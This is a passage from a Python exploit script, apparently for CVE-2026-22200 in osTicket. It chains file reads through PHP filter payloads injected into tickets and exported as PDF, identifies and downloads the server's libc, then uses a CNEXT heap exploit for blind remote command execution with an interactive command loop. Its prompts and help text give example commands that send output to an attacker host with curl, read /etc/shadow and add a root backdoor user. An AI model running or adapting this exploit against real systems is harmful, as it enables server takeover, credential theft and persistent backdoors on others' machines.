        #   /lib/x86_64-linux-gnu/libc.so.6
        #   /lib64/libc-2.17.so
        #   /usr/lib64/libc-2.31.so
        # Must NOT match other "libc-*" libraries:
        #   /usr/lib/libc-client.so.2007e.0  (IMAP c-client)
        libc_path = None
        maps_text = self._maps_data.decode("utf-8", errors="replace")

        # Debug: show maps summary
        maps_lines = maps_text.splitlines()
        log_debug(
            f"Maps data: {len(self._maps_data):,} bytes, "
            f"{len(maps_lines)} lines."
        )
        if maps_lines:
            log_debug(f"  First line: {maps_lines[0][:120]}")

        # Show all libc-related entries for debugging
        libc_related: list[str] = []
        for line in maps_lines:
            if "libc" in line.lower():
                libc_related.append(line.strip())
        if libc_related:
            log_debug(
                f"  Lines containing 'libc' "
                f"({len(libc_related)}):"
            )
            for lr in libc_related[:8]:
                log_debug(f"    {lr[:140]}")
        else:
            log_warn(
                "No lines containing 'libc' found in maps!  "
                "First 5 lines:"
            )
            for lr in maps_lines[:5]:
                log_debug(f"    {lr[:140]}")

        # Pattern: libc.so.6 or libc-X.Y.so (where X.Y is a
        # numeric glibc version like 2.17, 2.31, 2.35)
        glibc_re = re.compile(
            r"/(libc\.so\.6|libc-\d+\.\d+\.so)\b"
        )

        # Parse maps lines properly: fields are whitespace-separated
        # addr perms offset dev inode [pathname]
        for line in maps_lines:
            fields = line.split()
            if len(fields) < 6:
                continue  # no pathname
            perms = fields[1] if len(fields) > 1 else ""
            if "r" not in perms:
                continue
            path = fields[5]
            if glibc_re.search(path):
                libc_path = path
                log_debug(f"  Matched glibc: {path}")
                break

        if not libc_path:
            # Second pass: look for any libc*.so that is NOT
            # a known non-glibc library
            non_glibc = {
                "libc-client", "libcrypt", "libcap",
                "libcom_err", "libcurl", "libcairo",
                "libcares", "libclang", "libcolord",
            }
            for line in maps_lines:
                fields = line.split()
                if len(fields) < 6:
                    continue
                perms = fields[1] if len(fields) > 1 else ""
                if "r" not in perms:
                    continue
                path = fields[5]
                basename = os.path.basename(path)
                if not basename.startswith("libc"):
                    continue
                # Skip known non-glibc libraries
                if any(
                    basename.startswith(n) for n in non_glibc
                ):
                    log_debug(f"  Skipping non-glibc: {path}")
                    continue
                # Accept if it looks like a shared library
                if ".so" in basename:
                    libc_path = path
                    log_warn(
                        f"Fuzzy glibc match: {path} — "
                        f"verify this is actually glibc"
                    )
                    break

        if not libc_path:
            log_fail(
                "Cannot determine libc path from /proc/self/maps."
            )
            log_info(
                "This usually means the maps data is corrupted "
                "or the libc path doesn't match expected patterns."
            )
            # Dump maps for manual analysis
            maps_dump = os.path.join(
                self._tmpdir, "proc_self_maps.txt"
            )
            with open(maps_dump, "w") as fh:
                fh.write(maps_text)
            log_info(f"Maps saved to: {maps_dump}")
            return False
        log_info(f"Target libc: {libc_path}")

        # Generate payload and inject via a NEW ticket
        # (replies are not always included in PDF exports)
        log_info("Generating PHP filter payload for partial libc…")
        libc_uri = PayloadGenerator.build_file_read_filter(
            libc_path, encoding="b64zlib"
        )
        ticket_html = PayloadGenerator.wrap_for_ticket(
            [libc_uri], is_reply=False
        )

        log_info("Creating new ticket with libc payload…")
        libc_ticket_id = self._create_ticket(ticket_html)
        if not libc_ticket_id:
            # Fallback: try via reply on existing ticket
            log_warn(
                "New ticket failed; trying reply on "
                "existing ticket…"
            )
            reply_html = PayloadGenerator.wrap_for_ticket(
                [libc_uri], is_reply=True
            )
            if not self._reply_to_ticket(
                self.ticket_id, reply_html
            ):
                log_fail("Both new ticket and reply failed.")
                return False
            libc_ticket_id = self.ticket_id
        else:
            log_good(
                f"Libc ticket created (ID: {libc_ticket_id})."
            )

        log_info("Exporting ticket to PDF…")
        pdf_bytes = self._print_ticket_pdf(libc_ticket_id)
        if not pdf_bytes:
            log_fail("Failed to export PDF.")
            return False

        extracted = PDFExtractor.extract_from_pdf(
            pdf_bytes, save_dir=self._tmpdir
        )

        # Find the libc chunk — exclude known non-libc data
        partial_libc: Optional[bytes] = None
        for data in extracted:
            # Skip if it looks like /proc/self/maps
            if self._looks_like_maps(data):
                log_debug(
                    f"  Skipping {len(data):,} B chunk "
                    f"(looks like /proc/self/maps)"
                )
                continue
            # Skip if it looks like /etc/passwd
            if b"root:" in data and b"/bin/" in data:
                log_debug(
                    f"  Skipping {len(data):,} B chunk "
                    f"(looks like /etc/passwd)"
                )
                continue
            # Skip if it looks like ost-config.php
            if b"SECRET_SALT" in data or b"DBPASS" in data:
                log_debug(
                    f"  Skipping {len(data):,} B chunk "
                    f"(looks like ost-config.php)"
                )
                continue

            # Accept ELF magic or large binary blobs
            if len(data) > 4 and data[:4] == b"\x7fELF":
                log_debug("  Found ELF header in chunk.")
                partial_libc = data
                break
            if len(data) > 10000:
                partial_libc = data
                break

        if not partial_libc:
            log_fail(
                "Could not extract partial libc from PDF.  "
                f"Got {len(extracted)} chunk(s) but none "
                f"look like libc data."
            )
            for i, d in enumerate(extracted):
                log_debug(
                    f"  Chunk {i}: {len(d):,} B, "
                    f"starts with {d[:16].hex()}"
                )
            return False
        log_good(f"Partial libc: {len(partial_libc):,} bytes.")

        # Save partial libc for manual inspection
        partial_path = os.path.join(
            self._tmpdir, "partial_libc.bin"
        )
        with open(partial_path, "wb") as fh:
            fh.write(partial_libc)
        log_info(f"Partial libc saved: {partial_path}")
        log_debug(
            f"First 32 bytes: {partial_libc[:32].hex()}"
        )

        # Extract Build ID
        build_id = LibcResolver.extract_build_id(partial_libc)
        if not build_id:
            log_warn(
                "Could not extract GNU Build ID via ELF parsing."
            )
            log_debug(
                f"GNU\\x00 occurrences in data: "
                f"{partial_libc.count(b'GNU' + b'\\x00')}"
            )

            # Fallback A: try to find a glibc version string and
            # use it to guess the libc.rip ID
            build_id = self._fallback_version_string(
                partial_libc, libc_path
            )

        if not build_id:
            log_fail(
                "All Build ID extraction strategies failed."
            )
            partial_path = os.path.join(
                self._tmpdir, "partial_libc.bin"
            )
            log_info(
                f"Inspect the partial dump manually:\n"
                f"        readelf -n {partial_path}\n"
                f"        strings {partial_path} | grep GLIBC\n"
                f"        xxd {partial_path} | head -20"
            )
            return False
        log_good(f"Build ID: {build_id}")

        # Download full libc
        log_info("Downloading full libc from libc.rip…")
        full_libc = LibcResolver.download_libc(build_id)
        if not full_libc:
            log_fail(
                "Could not download libc.  "
                "You may need to provide it manually."
            )
            return False

        self._libc_path = os.path.join(self._tmpdir, "libc.so.6")
        with open(self._libc_path, "wb") as fh:
            fh.write(full_libc)
        log_good(f"Full libc saved ({len(full_libc):,} bytes).")

        return True

    def _fallback_version_string(
        self,
        partial_libc: bytes,
        libc_path: str,
    ) -> Optional[str]:
        """When Build ID extraction fails, try alternative
        identification strategies:

        A. Search for ``GNU C Library … version X.Y`` in the binary
           and query libc.rip by guessing the package ID.
        B. Search for ``GLIBC_X.Y`` symbol version strings to
           determine the glibc version range.
        C. Use the libc filesystem path to guess the distro package.

        Returns
        -------
        str or None
            A Build ID found via libc.rip, or ``None``.
        """
        text = partial_libc.decode("ascii", errors="ignore")

        # --- A: exact version string ---
        # Pattern: "GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.8) …"
        ver_match = re.search(
            r"GNU C Library[^)]*?(\d+\.\d+[-.\w]*)\)",
            text,
        )
        if ver_match:
            ver_str = ver_match.group(0)
            log_info(f"Found glibc version string: {ver_str}")

        # --- B: highest GLIBC_x.y symbol version ---
        glibc_versions = re.findall(r"GLIBC_(\d+\.\d+)", text)
        if glibc_versions:
            # Deduplicate and sort
            versions = sorted(
                set(glibc_versions),
                key=lambda v: list(map(int, v.split("."))),
            )
            highest = versions[-1]
            log_info(
                f"Symbol versions found: "
                f"{', '.join(versions[-5:])} "
                f"(highest: GLIBC_{highest})"
            )
        else:
            highest = None

        # --- C: guess distro from libc path ---
        # e.g. /lib/x86_64-linux-gnu/libc.so.6 → Debian/Ubuntu
        # e.g. /usr/lib64/libc-2.17.so → RHEL/CentOS
        if (
            "x86_64" in libc_path
            or "lib64" in libc_path
            or "amd64" in libc_path
        ):
            arch = "amd64"
        elif "i386" in libc_path or "i686" in libc_path:
            arch = "i386"
        else:
            # Guess from maps: 48-bit addresses → amd64
            maps_text = self._maps_data.decode(
                "utf-8", errors="replace"
            )
            first_addr = re.search(r"([0-9a-f]+)-", maps_text)
            if first_addr and len(first_addr.group(1)) > 8:
                arch = "amd64"
            else:
                arch = "i386"
        log_debug(f"Libc path: {libc_path}, arch guess: {arch}")

        # Detect distro family from path patterns
        is_rhel = (
            "/usr/lib64/" in libc_path
            or "/lib64/" in libc_path
        )
        is_debian = (
            "x86_64-linux-gnu" in libc_path
            or "i386-linux-gnu" in libc_path
        )
        if is_rhel:
            log_debug("Distro guess: RHEL/CentOS family")
        elif is_debian:
            log_debug("Distro guess: Debian/Ubuntu family")

        # Try to construct candidate IDs for libc.rip
        if highest:
            candidates = []

            # If we found an exact version, try that first
            if ver_match:
                exact_ver = re.search(
                    r"(\d+\.\d+[-.\w]+)", ver_match.group(0)
                )
                if exact_ver:
                    v = exact_ver.group(1)
                    candidates.append(f"libc6_{v}_{arch}")

            # RHEL/CentOS patterns
            if is_rhel or not is_debian:
                candidates.extend([
                    f"libc6_{highest}-93ubuntu4_{arch}",
                    f"libc6_{highest}-0ubuntu5_{arch}",
                    f"libc6_{highest}-0ubuntu5.1_{arch}",
                ])

            # Ubuntu/Debian patterns
            candidates.extend([
                f"libc6_{highest}-0ubuntu1_{arch}",
                f"libc6_{highest}-0ubuntu3_{arch}",
                f"libc6_{highest}-0ubuntu3.1_{arch}",
                f"libc6_{highest}-0ubuntu3.8_{arch}",
                f"libc6_{highest}-0ubuntu5_{arch}",
                f"libc6_{highest}-0ubuntu10_{arch}",
            ])

            log_info(
                "Trying to identify libc via version strings…"
            )
            for cid in candidates:
                log_debug(f"  Trying ID: {cid}")
                try:
                    url = (
                        f"{LibcResolver.LIBC_RIP_API}"
                        f"/find"
                    )
                    resp = requests.post(
                        url,
                        json={"id": cid},
                        timeout=REQUEST_TIMEOUT,
                        headers={
                            "Content-Type": "application/json",
                        },
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        if isinstance(data, list) and data:
                            bid = data[0].get("buildid")
                            if bid:
                                log_good(
                                    f"Matched via ID: "
                                    f"{data[0].get('id')}"
                                )
                                return bid
                except requests.RequestException:
                    continue

        # --- D: try symbol-based search using /proc/self/maps ---
        if self._maps_data:
            bid = self._fallback_symbol_search(libc_path)
            if bid:
                return bid

        log_fail(
            "Version-string fallback did not find a match."
        )
        return None

    def _fallback_symbol_search(
        self, libc_path: str
    ) -> Optional[str]:
        """Try to identify the libc via known function offsets.

        Parse ``/proc/self/maps`` for the libc base address, then
        look for known function PLT/GOT entries in the PHP binary's
        maps to compute symbol offsets.  Query libc.rip with those.
        """
        maps_text = self._maps_data.decode(
            "utf-8", errors="replace"
        )
        glibc_re = re.compile(
            r"/(libc\.so\.6|libc-\d+\.\d+\.so)\b"
        )
        libc_base = None
        for line in maps_text.splitlines():
            fields = line.split()
            if len(fields) < 6:
                continue
            if "r-xp" not in fields[1]:
                continue
            if glibc_re.search(fields[5]):
                addr = fields[0].split("-")[0]
                libc_base = int(addr, 16)
                break

        if not libc_base:
            return None

        log_debug(f"Libc base (r-xp): 0x{libc_base:x}")

        # We don't have leaked function addresses from the
        # running process, so this strategy is limited.
        # But we can extract the libc version from the path
        # name patterns in /proc/self/maps.
        # e.g. /lib/x86_64-linux-gnu/libc-2.31.so
        path_match = re.search(
            r"libc[.-](\d+\.\d+)", libc_path
        )
        if path_match:
            ver = path_match.group(1)
            log_info(
                f"Libc version from path: {ver}"
            )

            # Determine arch from path
            if "lib64" in libc_path or "x86_64" in libc_path:
                archs = ["amd64"]
            elif "i386" in libc_path or "i686" in libc_path:
                archs = ["i386"]
            else:
                archs = ["amd64", "i386"]

            # Build candidate IDs covering multiple distros
            candidates = []
            for a in archs:
                # Debian/Ubuntu patterns
                for suffix in (
                    f"-0ubuntu1_{a}",
                    f"-0ubuntu3_{a}",
                    f"-0ubuntu3.1_{a}",
                    f"-0ubuntu5_{a}",
                    f"-0ubuntu10_{a}",
                    f"-93ubuntu4_{a}",
                ):
                    candidates.append(f"libc6_{ver}{suffix}")

            for cid in candidates:
                try:
                    url = (
                        f"{LibcResolver.LIBC_RIP_API}"
                        f"/find"
                    )
                    resp = requests.post(
                        url,
                        json={"id": cid},
                        timeout=REQUEST_TIMEOUT,
                        headers={
                            "Content-Type": (
                                "application/json"
                            ),
                        },
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        if isinstance(data, list) and data:
                            bid = data[0].get("buildid")
                            if bid:
                                log_good(
                                    f"Matched via "
                                    f"path-based ID: "
                                    f"{data[0].get('id')}"
                                )
                                return bid
                except requests.RequestException:
                    continue

        return None

    # ──────────────────────────────────────────────────────────────────────────
    #  STAGE 5: CNEXT RCE
    # ──────────────────────────────────────────────────────────────────────────

    # ──────────────────────────────────────────────────────────────────────────
    #  STAGE 5: CNEXT RCE → ONE-SHOT COMMAND
    # ──────────────────────────────────────────────────────────────────────────

    def stage_cnext_rce(self) -> bool:
        """Generate and inject CNEXT payload that executes a single command.

        The command output is **blind** — it is not returned to us.
        To exfiltrate output, use techniques like:
          cmd | curl -d @- http://attacker:8000/
          cmd > /tmp/out && curl -F f=@/tmp/out http://attacker/

        Returns ``True`` if the payload was successfully triggered.
        """
        log_stage(5, "CNEXT RCE → ONE-SHOT COMMAND")

        if not HAS_PWNTOOLS:
            log_fail("pwntools is required.  pip install pwntools")
            return False

        # Get command from user
        if self._oneshot_cmd:
            shell_cmd = self._oneshot_cmd
        else:
            log_info(
                "Enter the command to execute on the target."
            )
            log_info(
                "Output is BLIND — use curl/wget to exfil, "
                "or write to a web-accessible path."
            )
            log_info("Examples:")
            print(
                f"        {Style.DIM}"
                f"id | curl -d @- http://YOURIP:8000/"
                f"{Style.RESET}"
            )
            print(
                f"        {Style.DIM}"
                f"cat /etc/shadow > /tmp/loot.txt"
                f"{Style.RESET}"
            )
            print(
                f"        {Style.DIM}"
                f"useradd -o -u0 -g0 -M -s/bin/bash pwned "
                f"&& echo pwned:pwned|chpasswd"
                f"{Style.RESET}"
            )
            print()
            try:
                shell_cmd = input(
                    f"  {Style.CYAN}[?]{Style.RESET} "
                    f"Command: "
                ).strip()
            except (KeyboardInterrupt, EOFError):
                print()
                log_fail("Aborted.")
                return False

        if not shell_cmd:
            log_fail("No command provided.")
            return False

        # Validate length (CNEXT budget: ~290 bytes)
        prefix_len = 30
        if len(shell_cmd) + prefix_len > 310:
            log_fail(
                f"Command too long: {len(shell_cmd)} bytes "
                f"(max ~280).  Shorten it or use a stager."
            )
            return False

        log_info(f"Command: {shell_cmd}")
        log_debug(
            f"Command length: {len(shell_cmd)} bytes "
            f"(+~{prefix_len} prefix)"
        )
        log_info("Building CNEXT heap exploitation payload…")

        try:
            builder = CNEXTBuilder(
                command=shell_cmd,
                maps_data=self._maps_data,
                libc_path=self._libc_path,
            )
            cnext_uri = builder.build()
        except Exception as exc:
            log_fail(f"CNEXT payload generation failed: {exc}")
            traceback.print_exc()
            return False

        log_good(
            f"CNEXT payload generated ({len(cnext_uri):,} chars)."
        )

        # Inject via a NEW ticket
        ticket_html = PayloadGenerator.wrap_for_ticket(
            [cnext_uri], is_reply=False
        )
        log_info("Creating new ticket with CNEXT payload…")
        cnext_ticket_id = self._create_ticket(ticket_html)
        if not cnext_ticket_id:
            log_warn("New ticket failed; trying reply…")
            reply_html = PayloadGenerator.wrap_for_ticket(
                [cnext_uri], is_reply=True
            )
            if not self._reply_to_ticket(
                self.ticket_id, reply_html
            ):
                log_fail("Both new ticket and reply failed.")
                return False
            cnext_ticket_id = self.ticket_id
        else:
            log_good(
                f"CNEXT ticket created (ID: {cnext_ticket_id})."
            )
        log_good("CNEXT payload injected.")

        # Trigger via PDF export
        log_info(
            "Triggering CNEXT via PDF export "
            "(expect a connection error)…"
        )
        try:
            self._print_ticket_pdf(cnext_ticket_id)
            log_info(
                "PDF export returned normally — "
                "exploit may not have triggered."
            )
        except Exception:
            log_good(
                "Connection error (expected) — "
                "payload was triggered!"
            )

        time.sleep(2)

        log_good("Command should have been executed (blind).")
        log_info(
            "Remember: output is NOT returned to you.\n"
            "        Check your exfiltration channel or "
            "the target for results."
        )
        return True

    def stage_cnext_multi(self) -> None:
        """Interactive mode: keep sending one-shot commands
        until the user decides to stop.

        Each command creates a new ticket + CNEXT trigger.
        """
        log_stage(6, "MULTI-COMMAND MODE")
        log_info(
            "Send additional commands.  Each one triggers a "
            "new CNEXT payload."
        )
        log_warn(
            "Each trigger crashes a PHP worker.  "
            "Don't spam too fast."
        )
        log_info("Type 'exit' or press Ctrl+C to quit.\n")

        while True:
            try:
                cmd = input(
                    f"  {Style.RED}{Style.BOLD}"
                    f"cmd>{Style.RESET} "
                ).strip()
                if not cmd:
                    continue
                if cmd.lower() in ("exit", "quit"):
                    log_info("Exiting.")
                    break

                # Save and execute
                self._oneshot_cmd = cmd
                self.stage_cnext_rce()
                print()

            except KeyboardInterrupt:
                print()
                log_info("Exiting.")
                break

    # ──────────────────────────────────────────────────────────────────────────
    #  MAIN ENTRY POINT
    # ──────────────────────────────────────────────────────────────────────────

    def run(self) -> None:
        """Execute the full exploitation chain."""
        banner()

        parsed = urlparse(self.base_url)
        if not parsed.scheme or not parsed.netloc:
            log_fail(
                "Invalid URL.  Include the scheme "
                "(http:// or https://)."
            )
            sys.exit(1)

        log_info(f"Target : {Style.BOLD}{self.base_url}{Style.RESET}")
        log_info(f"Proxy  : {self.proxy or 'None'}")
        if self._oneshot_cmd:
            log_info(f"Command: {self._oneshot_cmd}")
        else:
            log_info("Mode   : interactive one-shot")
        log_info(f"Workdir: {self._tmpdir}")
        print()

        # --- STAGE 1 ---
        if not self.stage_recon():
            log_fail("Reconnaissance failed.  Aborting.")
            sys.exit(1)

        # --- STAGE 2 ---
        if not self.stage_authenticate():
            log_fail("Authentication failed.  Aborting.")
            sys.exit(1)

        # --- STAGE 3 ---
        if not self.stage_file_exfiltration():
            log_fail("File exfiltration failed.  Aborting.")
            log_info(f"Debug artefacts saved in: {self._tmpdir}")
            sys.exit(1)

        # --- STAGE 4 ---
        if not self.stage_libc_acquisition():
            log_fail(
                "Libc acquisition failed.  "
                "Stopping before RCE stage."
            )
            log_info(
                f"Exfiltrated files saved in: {self._tmpdir}"
            )
            sys.exit(1)

        # --- STAGE 5 ---
        if not self.stage_cnext_rce():
            log_fail("CNEXT RCE failed.  See above for details.")
            sys.exit(1)

        # --- STAGE 6: multi-command mode ---
        if not self._oneshot_cmd:
            # Interactive — already executed first command,
            # offer to send more
            self.stage_cnext_multi()
        else:
            # Non-interactive — single command, done
            pass

        log_info(f"Done.  Artefacts saved in: {self._tmpdir}")


# ═══════════════════════════════════════════════════════════════════════════════
#  CLI ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

def parse_arguments() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description=(
            "CVE-2026-22200 — osTicket file read + CNEXT → "
            "ONE-SHOT COMMAND EXECUTION (blind).  "
            "No file written on target."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  # Interactive mode (prompts for command):\n"
            "  %(prog)s https://support.example.com\n\n"
            "  # Non-interactive (single command):\n"
            "  %(prog)s https://target.com "
            "--command 'id | curl -d @- http://10.0.0.1:8000/'\n\n"
            "  # Create a backdoor user:\n"
            "  %(prog)s https://target.com "
            "--command 'useradd -o -u0 hacker'\n\n"
            "NOTE: Command output is BLIND.  Use curl/wget\n"
            "      to exfiltrate output to your server.\n"
        ),
    )
    parser.add_argument(
        "target",
        help="Base URL of the osTicket installation.",
    )
    parser.add_argument(
        "--command", "-c",
        help=(
            "Command to execute (max ~280 bytes).  "
            "If omitted, prompts interactively."
        ),
        default=None,
    )
    parser.add_argument(
        "--proxy",
        help="HTTP proxy URL (e.g. http://127.0.0.1:8080).",
        default=None,
    )
    parser.add_argument(
        "--topic-id",
        type=int,
        help="Force a specific help-topic ID.",
        default=None,
    )
    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable coloured terminal output.",
    )
    return parser.parse_args()


def main() -> None:
    """CLI entry point."""
    args = parse_arguments()

    if args.no_color or not sys.stdout.isatty():
        Style.disable()

    exploit = OsTicketExploit(
        target_url=args.target,
        proxy=args.proxy,
        topic_id=args.topic_id,
        oneshot_cmd=args.command,
    )
    exploit.run()


if __name__ == "__main__":
    main()
